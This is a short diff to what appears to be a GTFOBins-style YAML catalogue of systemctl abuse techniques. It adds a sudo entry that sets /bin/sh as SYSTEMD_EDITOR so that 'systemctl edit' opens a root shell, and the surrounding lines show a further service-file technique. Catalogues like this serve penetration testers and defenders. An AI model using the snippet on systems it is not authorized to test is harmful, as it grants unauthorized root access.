@@ -12,6 +12,11 @@ functions:
         ./systemctl enable --now $TF
   sudo:
     - code: |
+        TF=$(mktemp)
+        echo /bin/sh >$TF
+        chmod +x $TF
+        sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
+    - code: |
         TF=$(mktemp).service
         echo '[Service]
         Type=oneshot
